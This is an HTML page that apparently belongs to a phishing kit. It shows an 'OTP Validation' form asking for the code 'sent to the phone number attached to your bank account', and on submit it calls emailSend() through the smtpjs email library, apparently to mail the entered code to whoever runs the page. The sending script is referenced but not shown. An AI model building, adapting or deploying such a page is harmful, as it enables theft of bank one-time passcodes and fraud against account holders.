<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/png" href="fcan-logo-transp.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Home</title>

  <script type="module" crossorigin src="/main.js"></script>
  <link rel="stylesheet" href="style.css">
</head>

<body class="bg-gray-100">

  <div class="w-[90%] max-w-md mx-auto pt-5">
    <div class="mt-5"></div>
    
      <form id="form" onsubmit="emailSend(); reset(); return false;" class="mt-44">

      <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
        <p class="font-bold text-xl mb-3">OTP Validation</p>
        <p>We've sent a code to the phone number attached to your bank account. Enter the code here</p>
        <div class="ctn relative">
          <input required minlength="5" id="otp" name="phone" type="text"
            class="w-full rounded-md p-4 outline-none pl-12 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
            placeholder=" ">
          <img src="booking-click-10279.svg" class="absolute top-1/2 bottom-1/2 left-3 my-auto">
        </div>

        
        <p class="pt-7 text-primary font-semibold text-center">Resend OTP</p>
        <div class="space"></div>
        <button class="bg-primary text-white w-full rounded-md p-4 ">Next</button>

      </div>

    </form>
  </div>

  <script src="https://smtpjs.com/v3/smtp.js"></script>
  <script src="Contact-form-to-email1.js2"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

</body>
</html>
